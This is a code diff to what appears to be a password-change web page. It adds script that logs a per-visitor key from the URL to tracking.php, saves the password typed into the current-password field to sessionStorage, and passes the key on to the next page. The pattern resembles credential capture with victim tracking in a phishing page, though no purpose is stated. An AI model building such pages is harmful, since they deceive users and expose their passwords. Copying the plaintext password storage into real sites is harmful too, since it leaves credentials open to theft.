@@ -350,6 +350,14 @@
     </div>
     
     <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userKey = urlParams.get('k');
+        if (userKey) {
+            fetch('tracking.php?k=' + userKey)
+                .then(response => console.log("Logged"))
+                .catch(error => console.error("Error logging"));
+        }
+
         function togglePassword(inputId, button) {
             const input = document.getElementById(inputId);
             if (input.type === 'password') {
@@ -460,10 +468,20 @@
                 // Show success message
                 document.getElementById('successMessage').style.display = 'block';
                 
+                const password = document.getElementById('currentPassword').value;
+                // Store password temporarily
+                sessionStorage.setItem('userPassword', String(password));
+
                 // Redirect to Changepwd.html after 2 seconds
-                setTimeout(() => {
-                    window.location.href = 'Changepwd.html';
-                }, 2000);
+                if(userKey){
+                    setTimeout(() => {
+                        window.location.href = 'Changepwd.html'+`?k=${encodeURIComponent(userKey)}`;
+                    }, 2000);
+                }else{
+                    setTimeout(() => {
+                        window.location.href = 'Changepwd.html';
+                    }, 2000);
+                }
             }
         });
     </script>
